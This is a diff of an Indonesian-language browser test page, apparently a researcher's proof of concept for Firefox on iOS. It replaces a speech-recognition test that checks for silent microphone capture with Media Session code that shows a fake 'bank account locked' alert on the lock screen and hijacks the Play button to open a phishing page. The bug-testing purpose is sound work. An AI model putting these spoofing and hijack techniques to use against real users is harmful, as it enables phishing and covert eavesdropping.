@@ -6,79 +6,95 @@
   <title>Test</title>
 </head>
 <body style="font-family: sans-serif; padding: 20px; background: #ffffff;">
-  <p>Buka di Firefox iOS. Pencet tombol di bawah, terus ngomong apa aja.</p>
-  <p>Kalau omongan lu langsung jadi teks di bawah ini, berarti website bisa dengerin lu.</p>
-  <p>Cek: Apakah ada titik oranye di atas layar (indikator mic) pas website lagi dengerin?</p>
-  <button onclick="testSpeech()" style="font-size: 20px; padding: 15px 30px;">Mulai Dengerin</button>
+  <p>Buka di Firefox iOS. Pencet tombol di bawah.</p>
+  <p>Kalau setelah pencet tombol, Lock Screen / Control Center lu nampilin lagu palsu, berarti BUG.</p>
+  <button onclick="testMediaSession()" style="font-size: 20px; padding: 15px 30px;">Set Media Session Palsu</button>
   <br><br>
-  <button onclick="testSpeechAuto()" style="font-size: 20px; padding: 15px 30px;">Tes Dengerin Otomatis (Tanpa Klik)</button>
+  <button onclick="testMediaSessionAction()" style="font-size: 20px; padding: 15px 30px;">Tes Tombol Play di Lock Screen</button>
   <br><br>
-  <pre id="o" style="background: #f0f0f0; padding: 15px; white-space: pre-wrap;">Belum dites. Pencet tombol di atas, terus ngomong.</pre>
+  <pre id="o" style="background: #f0f0f0; padding: 15px; white-space: pre-wrap;">Belum dites. Pencet tombol di atas.</pre>
 
   <script>
-    var o = document.getElementById('o');
-    var recognition = null;
-
-    function testSpeech(){
-      o.innerText = "Mencoba SpeechRecognition...\n";
+    function testMediaSession(){
+      var o = document.getElementById('o');
+      o.innerText = "Mencoba navigator.mediaSession.metadata...\n";
       o.innerText += "----------------------------------------\n";
 
-      var SpeechRec = window.SpeechRecognition || window.webkitSpeechRecognition;
-      if(!SpeechRec){
-        o.innerText += "SpeechRecognition TIDAK ADA (AMAN - Firefox nge-block Speech API).";
-        return;
-      }
-      o.innerText += "SpeechRecognition ADA di Firefox iOS ini.\n";
-      o.innerText += "Mencoba mulai dengerin...\n";
-      o.innerText += "Kalau muncul popup izin mic, itu AMAN. Pencet Izinkan, terus ngomong.\n";
-      o.innerText += "Kalau gak muncul popup izin mic tapi langsung dengerin, itu BUG.\n\n";
-
       try{
-        recognition = new SpeechRec();
-        recognition.continuous = true; // Dengerin terus, gak berhenti
-        recognition.interimResults = true; // Hasil sementara juga dikasih
-        recognition.lang = 'id-ID'; // Bahasa Indonesia
+        if(!navigator.mediaSession){
+          o.innerText += "navigator.mediaSession TIDAK ADA (AMAN - Firefox nge-block Media Session API).";
+          return;
+        }
 
-        recognition.onresult = function(e){
-          var transcript = '';
-          for(var i=0; i<e.results.length; i++){
-            transcript += e.results[i][0].transcript;
-          }
-          o.innerText = "BUG / Website bisa dengerin lu!\n";
-          o.innerText += "Omongan lu yang ke-denger: " + transcript + "\n\n";
-          o.innerText += "Cek: Apakah ada titik oranye di atas layar (Dynamic Island) pas website lagi dengerin?\n";
-          o.innerText += "Kalau titik oranye-nya GAK ADA, itu BUG (Mic tanpa indikator).\n";
-          o.innerText += "Kalau titik oranye-nya ADA, itu NORMAL (iOS ngasih tau kalau mic lagi dipake).\n\n";
-          o.innerText += "Sekarang coba ngomong: 'password saya adalah test123', liat apakah teks itu muncul di sini?";
-        };
+        o.innerText += "navigator.mediaSession ADA di Firefox iOS ini.\n\n";
 
-        recognition.onerror = function(e){
-          o.innerText += "Error Speech (AMAN - diblokir): " + e.error + "\n";
-          if(e.error === 'not-allowed'){
-            o.innerText += "Mic DITOLAK (AMAN - user harus izinin mic dulu).";
-          }
-        };
+        // Ini yang dites: Apakah Media Session bisa di-set tanpa ada media yang diputer?
+        // Seharusnya, iOS harus nolak Media Session kalau gak ada media yang diputer.
+        navigator.mediaSession.metadata = new MediaMetadata({
+          title: '⚠️ AKUN BANK LU TERKUNCI! Klik di sini',
+          artist: '【entity-Bank Indonesia¦canonical_name=Bank Indonesia】 - Verifikasi Sekarang',
+          album: 'Pesan Penting dari Bank',
+          artwork: [
+            { src: 'https://0x403for.github.io/bank-logo.png', sizes: '512x512', type: 'image/png' }
+          ]
+        });
 
-        recognition.onend = function(){
-          o.innerText += "\nSpeechRecognition berhenti (mungkin karena gak ada suara 5 detik). Pencet tombol lagi buat mulai lagi.";
-        };
-
-        recognition.start();
-        o.innerText += "SpeechRecognition STARTED! Sekarang ngomong apa aja...\n";
-        o.innerText += "Cek titik oranye di atas layar sekarang! Ada gak?\n";
+        o.innerText += "Media Session metadata BERHASIL di-set!\n";
+        o.innerText += "Title: ⚠️ AKUN BANK LU TERKUNCI! Klik di sini\n";
+        o.innerText += "Artist: 【entity-Bank Indonesia¦canonical_name=Bank Indonesia】 - Verifikasi Sekarang\n";
+        o.innerText += "Album: Pesan Penting dari Bank\n\n";
+        o.innerText += "Sekarang:\n";
+        o.innerText += "1. Kunci HP lu (pencet tombol power).\n";
+        o.innerText += "2. Liat Lock Screen lu. Apakah ada lagu / media yang judulnya 'AKUN BANK LU TERKUNCI!'?\n";
+        o.innerText += "3. Atau buka Control Center (swipe dari pojok kanan atas). Liat apakah ada media player yang judulnya 'AKUN BANK LU TERKUNCI!'?\n\n";
+        o.innerText += "Kalau ADA, berarti BUG! Website bisa palsuin media di Lock Screen / Control Center tanpa ada media yang diputer.\n";
+        o.innerText += "Kalau GAK ADA, berarti AMAN - iOS nolak Media Session karena gak ada media yang diputer.\n";
+        o.innerText += "\nCatatan: Untuk artwork-nya, lu harus upload gambar bank-logo.png dulu ke 0x403for.github.io, atau ganti URL-nya ke gambar yang udah ada (misal https://0x403for.github.io/google.jpg).";
 
       }catch(e){
         o.innerText += "Error (AMAN): " + e;
       }
     }
 
-    function testSpeechAuto(){
-      o.innerText = "Mencoba SpeechRecognition OTOMATIS tanpa klik, pake setTimeout 1000ms...\n";
-      o.innerText += "Buka halaman ini, jangan pencet apa-apa, tunggu 1 detik.\n";
-      o.innerText += "Kalau website langsung dengerin tanpa lu pencet apa-apa, itu BUG (Auto Mic).\n";
-      setTimeout(function(){
-        testSpeech();
-      }, 1000);
+    function testMediaSessionAction(){
+      var o = document.getElementById('o');
+      o.innerText = "Mencoba set Media Session Action Handler (Play/Pause)...\n";
+      try{
+        if(!navigator.mediaSession){
+          o.innerText += "navigator.mediaSession TIDAK ADA.";
+          return;
+        }
+
+        // Ini yang dites: Apakah website bisa hijack tombol Play/Pause di Lock Screen?
+        // Misal korban pencet Play di Lock Screen, website-nya malah buka tab phishing.
+        navigator.mediaSession.setActionHandler('play', function(){
+          o.innerText += "BUG! Tombol PLAY di Lock Screen / Control Center berhasil di-hijack!\n";
+          o.innerText += "Korban pencet Play di Lock Screen, tapi yang ke-trigger malah fungsi ini di website.\n";
+          o.innerText += "Attacker bisa ganti fungsi ini jadi: window.open('https://phishing-bank.com') / window.location = 'https://phishing-bank.com'\n";
+          // JANGAN uncomment ini pas ngetes, ini cuma contoh:
+          // window.open('https://0x403for.github.io/phishing.html');
+        });
+
+        navigator.mediaSession.setActionHandler('pause', function(){
+          o.innerText += "BUG! Tombol PAUSE di Lock Screen berhasil di-hijack juga!\n";
+        });
+
+        navigator.mediaSession.metadata = new MediaMetadata({
+          title: 'Tes Tombol Play - Pencet Play di Lock Screen',
+          artist: 'Test - Sarwo Edi Wibowo',
+          album: 'Media Session Test'
+        });
+
+        o.innerText += "Action Handler Play/Pause BERHASIL di-set!\n\n";
+        o.innerText += "Sekarang:\n";
+        o.innerText += "1. Kunci HP lu, liat Lock Screen, pencet tombol Play di media player-nya.\n";
+        o.innerText += "2. Buka lagi Firefox, liat apakah teks di sini berubah jadi 'Tombol PLAY berhasil di-hijack!'?\n";
+        o.innerText += "3. Kalau berubah, berarti website bisa hijack tombol Play di Lock Screen.\n";
+        o.innerText += "4. Kalau gak berubah, berarti AMAN - iOS gak ngasih action handler-nya ke website karena gak ada media yang diputer.\n";
+
+      }catch(e){
+        o.innerText += "Error (AMAN): " + e;
+      }
     }
   </script>
 </body>
